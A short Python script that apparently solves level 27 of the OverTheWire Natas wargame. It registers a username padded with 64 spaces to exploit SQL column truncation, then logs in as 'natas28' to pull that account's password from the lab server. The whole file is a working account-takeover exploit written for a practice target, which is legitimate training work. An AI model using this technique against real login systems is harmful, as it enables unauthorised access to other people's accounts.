import requests
import re
from natas_utility import *
import html

current_level = 27
credentials = get_credentials(current_level)

base_url = 'http://{}.natas.labs.overthewire.org'.format(credentials['username'])
auth = (credentials['username'], credentials['password'])

url = base_url
data = {'username': 'natas28{}{}'.format(' ' * 64, 'a'),
        'password': ''}

session = requests.session()

session.post(url=base_url, data=data, auth=auth)

data = {'username': 'natas28',
        'password': ''}

response = session.post(url=base_url, data=data, auth=auth)
content = html.unescape(response.content.decode('utf-8')).replace('<br />', '\n').replace('<br>', '\n')

password_regex = re.compile(r'\[password\] => (.+)')
next_password = password_regex.findall(content)[0]
print(next_password)

save_credentials(current_level + 1, next_password)
